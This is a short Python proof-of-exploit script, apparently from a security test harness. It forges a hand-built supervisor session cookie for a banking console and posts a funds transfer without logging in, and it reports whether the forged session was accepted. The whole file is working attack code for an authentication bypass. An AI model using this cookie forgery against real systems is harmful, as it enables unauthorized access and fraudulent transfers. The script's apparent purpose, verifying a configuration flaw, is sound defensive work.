"""LG-AUTH-001 proof-of-exploit: forge a session and post a transfer with NO login.

Sends the console a hand-built session cookie (lgsession = 'LG' + staff(10) + role(1) + branch(4)).
Fires when the console accepts it and returns a POSTED transfer result, which is only possible with
session_roaming=on. Under session_roaming=off the forged cookie is rejected and the login page is
returned (inert). Hits the console directly. Env: CONSOLE_URL, else PASCAL_URL.
"""

from harness import env, http

FORGED = "LGSUP0010000S0007"  # SUP001 / SUPERVISOR / branch 0007, constructed by hand


def fire():
    console = env.setting("CONSOLE_URL", env.url("PASCAL_URL"))
    reply = http.post(
        f"{console}/transfer",
        headers={"Cookie": f"lgsession={FORGED}"},
        data={"from_account": "000000000042", "to_account": "000000000043", "amount": "100.00",
              "currency": "USD", "requested_by": "0000000007"},
    )
    if "POSTED" in reply.text:
        return True, "forged session posted a transfer (no login)"
    return False, "forged cookie rejected"
